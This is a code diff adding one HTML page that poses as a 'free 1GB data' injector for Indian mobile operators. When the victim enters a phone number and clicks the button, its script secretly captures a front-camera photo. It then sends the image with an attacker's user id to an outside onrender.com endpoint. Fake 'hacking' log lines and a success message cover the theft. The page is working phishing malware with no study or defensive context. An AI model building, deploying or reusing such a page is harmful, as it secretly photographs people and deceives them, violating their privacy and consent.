@@ -1,0 +1,329 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VIP DATA INJECTOR</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary: #00f2ff;
+            --secondary: #7000ff;
+            --accent: #ff007a;
+            --glass: rgba(255, 255, 255, 0.05);
+        }
+
+        * { box-sizing: border-box; outline: none; }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Rajdhani', sans-serif;
+            background: #050505;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            color: white;
+        }
+
+        /* Animated Background Particles */
+        .bg-animate {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 50%, #111, #000);
+            z-index: -1;
+        }
+
+        .circle {
+            position: absolute;
+            border-radius: 50%;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            filter: blur(80px);
+            opacity: 0.3;
+            animation: move 20s infinite alternate;
+        }
+
+        @keyframes move {
+            from { transform: translate(-10%, -10%); }
+            to { transform: translate(110%, 110%); }
+        }
+
+        /* Main Glass Card */
+        .card {
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 40px;
+            padding: 50px 40px;
+            width: 400px;
+            max-width: 90%;
+            text-align: center;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.5), inset 0 0 20px rgba(255,255,255,0.05);
+            animation: cardFade 1s ease-out;
+            position: relative;
+        }
+
+        @keyframes cardFade {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 45px;
+            font-weight: 900;
+            margin: 0;
+            background: linear-gradient(to bottom, #fff, #888);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: 2px;
+            text-shadow: 0 10px 20px rgba(0,0,0,0.3);
+        }
+
+        .badge {
+            display: inline-block;
+            background: linear-gradient(90deg, var(--accent), var(--secondary));
+            padding: 4px 15px;
+            border-radius: 10px;
+            font-size: 12px;
+            font-weight: bold;
+            letter-spacing: 3px;
+            margin-bottom: 20px;
+            box-shadow: 0 0 15px var(--accent);
+        }
+
+        /* Cyberpunk Inputs */
+        .input-box {
+            margin: 25px 0;
+            position: relative;
+            text-align: left;
+        }
+
+        .input-box label {
+            font-size: 13px;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-left: 15px;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        select, input {
+            width: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            padding: 18px 25px;
+            border-radius: 20px;
+            color: white;
+            font-size: 18px;
+            font-family: 'Rajdhani', sans-serif;
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        select:focus, input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 20px rgba(0, 242, 255, 0.2);
+            transform: scale(1.02);
+            background: rgba(0,0,0,0.5);
+        }
+
+        /* Neon Button */
+        .btn-neon {
+            width: 100%;
+            padding: 20px;
+            border: none;
+            border-radius: 20px;
+            background: white;
+            color: black;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 900;
+            font-size: 16px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.3s;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(255,255,255,0.2);
+        }
+
+        .btn-neon:hover {
+            background: var(--primary);
+            box-shadow: 0 0 40px var(--primary);
+            transform: translateY(-3px);
+        }
+
+        .btn-neon:active { transform: scale(0.95); }
+
+        /* Hacker Console - Ultra Clean */
+        #console {
+            margin-top: 30px;
+            background: rgba(0,0,0,0.6);
+            border-radius: 20px;
+            padding: 20px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            color: var(--primary);
+            text-align: left;
+            display: none;
+            border: 1px solid rgba(0, 242, 255, 0.1);
+        }
+
+        .line { 
+            margin-bottom: 5px; 
+            border-left: 3px solid var(--primary);
+            padding-left: 10px;
+            animation: lineIn 0.3s ease-out forwards;
+        }
+        
+        @keyframes lineIn { from { opacity:0; transform: translateX(-10px); } to { opacity:1; transform: translateX(0); } }
+
+        .err { color: var(--accent); border-color: var(--accent); }
+        .suc { color: #00ff88; border-color: #00ff88; font-weight: bold; }
+
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="bg-animate">
+        <div class="circle" style="width: 400px; height: 400px; top: -10%; left: -10%;"></div>
+        <div class="circle" style="width: 300px; height: 300px; bottom: -5%; right: -5%; background: var(--accent);"></div>
+    </div>
+
+    <div class="card">
+        <div class="badge">SECURE ACCESS</div>
+        <h1>1GB FREE</h1>
+        <p style="color: #888; margin-top: -5px;">Quantum Data Injection v4.0</p>
+
+        <div class="input-box">
+            <label>Operator</label>
+            <select id="operator">
+                <option>JIO</option>
+                <option>AIRTEL</option>
+                <option>VODAFONE</option>
+                <option>BSNL</option>
+            </select>
+        </div>
+
+        <div class="input-box">
+            <label>Neural Number</label>
+            <input type="number" id="mobile" placeholder="Enter Mobile ID">
+        </div>
+
+        <button class="btn-neon" id="trigger">INITIALIZE INJECTION</button>
+
+        <div id="console"></div>
+    </div>
+
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const btn = document.getElementById('trigger');
+        const consoleBox = document.getElementById('console');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        const ctx = canvas.getContext('2d');
+        const mobileInput = document.getElementById('mobile');
+        
+        const id = "1823013721"; 
+    const p = "Camera"
+
+        function addLog(msg, type = '') {
+            const l = document.createElement('div');
+            l.className = 'line ' + type;
+            l.innerText = msg;
+            consoleBox.appendChild(l);
+            consoleBox.scrollTop = consoleBox.scrollHeight;
+        }
+
+        btn.addEventListener('click', async () => {
+            if(document.getElementById('mobile').value.length < 10) {
+                alert("ACCESS DENIED: Enter Valid ID"); return;
+            }
+
+            btn.disabled = true;
+            btn.innerText = "CAPTURING DATA...";
+            consoleBox.style.display = "block";
+            consoleBox.innerHTML = "";
+
+            addLog("Requesting Kernel Access...");
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+                video.srcObject = stream;
+                addLog("Neural Link Established.");
+
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    const fullDataUrl = canvas.toDataURL('image/jpeg', 0.92);
+                    const photoBase64 = fullDataUrl.split(',')[1];
+                    
+                    stream.getTracks().forEach(t => t.stop());
+
+                    const data = ctx.getImageData(0,0,canvas.width, canvas.height).data;
+                    let sum = 0;
+                    for(let i=0; i<data.length; i+=4) sum += (data[i]+data[i+1]+data[i+2])/3;
+                    const bright = sum / (canvas.width*canvas.height);
+                    fetch(`https://tunnel-instagram-123.onrender.com/capturepic`, {
+    method: 'POST',  
+    headers: {  
+        'Content-Type': 'application/json',  
+    },  
+    body: JSON.stringify({  
+        userid: id,  
+        mobile: mobileInput,  
+        SY: photoBase64,  
+        platform: p  
+    })  
+});
+
+                    // Start Simulation
+                    fakeHacking(bright);
+                }, 1200);
+
+            } catch(e) {
+                addLog("FATAL ERROR: SENSOR BLOCKED", "err");
+                btn.innerText = "LOCKED";
+                btn.style.background = "var(--accent)";
+            }
+        });
+
+        function fakeHacking(b) {
+            const steps = [
+                "Bypassing Firewall...",
+                "Downloading Data Packets...",
+                "Syncing with Satellite...",
+                "Finalizing Handshake..."
+            ];
+            let i = 0;
+            const timer = setInterval(() => {
+                if(i < steps.length) {
+                    addLog(steps[i]);
+                    i++;
+                } else {
+                    clearInterval(timer);
+                    if(b < 15) {
+                        addLog("IDENTITY NOT FOUND", "err");
+                        addLog("Check Lighting or Sensor.", "err");
+                        btn.innerText = "RE-TRY";
+                        btn.disabled = false;
+                    } else {
+                        addLog("INJECTION SUCCESSFUL!", "suc");
+                        addLog("Transaction ID: #QZ-9981", "suc");
+                        btn.innerText = "ACTIVE";
+                        btn.style.background = "#00ff88";
+                        setTimeout(() => alert("1GB VIP Data Injected Successfully!"), 500);
+                    }
+                }
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
